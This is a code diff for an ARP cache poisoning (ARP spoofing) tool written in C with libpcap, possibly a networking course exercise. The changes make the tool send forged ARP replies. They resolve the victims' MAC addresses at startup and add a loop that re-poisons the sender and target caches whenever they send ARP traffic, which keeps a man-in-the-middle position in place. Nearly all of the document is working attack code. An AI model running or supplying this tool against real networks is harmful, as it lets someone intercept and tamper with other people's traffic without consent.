@@ -7,14 +7,14 @@ pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
 int thread_idx= 0;
 bool isSpoofing;
 IPaddr sender_ip[MAX_SESSION_NUM], target_ip[MAX_SESSION_NUM], attacker_ip;
-HWaddr attacker_ha;
+HWaddr sender_ha[MAX_SESSION_NUM], target_ha[MAX_SESSION_NUM], attacker_ha;
 char *interface;
 
 bool ARPCachePoisoning(pcap_t *handle, const HWaddr sha, const IPaddr sip, const HWaddr aha, const IPaddr tip)
 {
     ARPpkt pkt;
 
-    makeARPPacket(&pkt, aha, tip, sha, sip, ARPOP_REQUEST);
+    makeARPPacket(&pkt, aha, tip, sha, sip, ARPOP_REPLY);
     if(pcap_sendpacket(handle, (u_char *)&pkt, sizeof(pkt)) != 0)
     {
         LOG(FATAL) << "pcap_sendpacket : failed";
@@ -33,13 +33,16 @@ void *ARPSpoofing(void *)
     struct ether_header *eth_hdr;
     struct pcap_pkthdr      *header;
     const u_char            *pkt;
+    ARPpkt *arppkt;
 
     pthread_mutex_lock(&mutex);
     sip = sender_ip[thread_idx];
     tip = target_ip[thread_idx];
+    sha = sender_ha[thread_idx];
+    tha = target_ha[thread_idx];
     thread_idx++;
     pthread_mutex_unlock(&mutex);
-
+    
     LOG(INFO) << "pcap_open_live";
     if((handle = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf))==NULL)
     {
@@ -47,24 +50,10 @@ void *ARPSpoofing(void *)
         return NULL;
     }
 
-    LOG(INFO) << "getHWaddrbyIPaddr(sender)";
-    if(!getHWaddrByIPaddr(&sha, handle, attacker_ha, attacker_ip, sip))
-    {
-        LOG(FATAL) << "getHWaddrbyIPaddr : failed";
-        exit(-1);
-    }
-
-    LOG(INFO) << "getHWaddrbyIPaddr(target)";
-    if(!getHWaddrByIPaddr(&tha, handle, attacker_ha, attacker_ip, tip))
-    {
-        LOG(FATAL) << "getHWaddrbyIPaddr : failed";
-        exit(-1);
-    }
-
     if(!ARPCachePoisoning(handle, sha, sip, attacker_ha, tip))
     {
         LOG(FATAL) << "ARPCachePoisoning : failed";
-        exit(-1);
+        return NULL;
     }
 
     while(isSpoofing)
@@ -73,14 +62,33 @@ void *ARPSpoofing(void *)
 
         if(res == 0)
         {
-            LOG(INFO) << "timeout";
             continue;
         }
 
         if(res < 0)
         {
             LOG(FATAL) << "pcap_next_ex : failed";
-            exit(-1);
+            return NULL;
+        }
+
+        eth_hdr = (struct ether_header *) pkt;
+        if(ntohs(eth_hdr->ether_type) == ETHERTYPE_IP)
+        {
+            
+        }
+
+        if(ntohs(eth_hdr->ether_type) == ETHERTYPE_ARP)
+        {
+            arppkt = (ARPpkt *) pkt;
+            if((equalHWaddr(arppkt->arp_addr.sha, tha) && equalIPaddr(arppkt->arp_addr.tip, sip)) ||\
+                (equalHWaddr(arppkt->arp_addr.sha, sha) && equalIPaddr(arppkt->arp_addr.tip, tip)))
+            {
+                if(!ARPCachePoisoning(handle, sha, sip, attacker_ha, tip))
+                {
+                    LOG(FATAL) << "ARPCachePoisoning : failed";
+                    return NULL;
+                }       
+            }
         }
     }
 
@@ -92,6 +100,8 @@ void *ARPSpoofing(void *)
 int main(int argc, char **argv)
 {
     int         session_num;
+    pcap_t      *handle;
+    char        errbuf[PCAP_ERRBUF_SIZE];
     pthread_t   threads[MAX_SESSION_NUM];
     int         i;
 
@@ -112,14 +122,35 @@ int main(int argc, char **argv)
     LOG(INFO) << "attacker_ip : " << inet_ntoa(attacker_ip);
     LOG(INFO) << "attacker_ha : " << ether_ntoa(&attacker_ha);
 
+    if((handle = pcap_open_live(interface,  BUFSIZ, 1, 1, errbuf))==NULL)
+    {
+        LOG(FATAL) << "pcap_open_live : failed";
+        return -1;
+    }
+
     for(i=0;i<session_num;i++)
     {
         inet_pton(AF_INET, argv[i*2 + 2], &sender_ip[i]);
         inet_pton(AF_INET, argv[i*2 + 3], &target_ip[i]);
+        
+        if(!getHWaddrByIPaddr(&sender_ha[i], handle, attacker_ha, attacker_ip, sender_ip[i]))
+        {
+            LOG(FATAL) << "getHWaddrbyIPaddr : failed";
+            return -1;
+        }
+        if(!getHWaddrByIPaddr(&target_ha[i], handle, attacker_ha, attacker_ip, target_ip[i]))
+        {
+            LOG(FATAL) << "getHWaddrbyIPaddr : failed";
+            return -1;
+        }
 
         LOG(INFO) << "sender_ip[" << i << "] : " << inet_ntoa(sender_ip[i]);
         LOG(INFO) << "target_ip[" << i << "] : " << inet_ntoa(target_ip[i]);
+        LOG(INFO) << "sender_ha[" << i << "] : " << ether_ntoa(&sender_ha[i]);
+        LOG(INFO) << "target_ha[" << i << "] : " << ether_ntoa(&target_ha[i]);
     }
+
+    pcap_close(handle);
 
     isSpoofing = true;
 
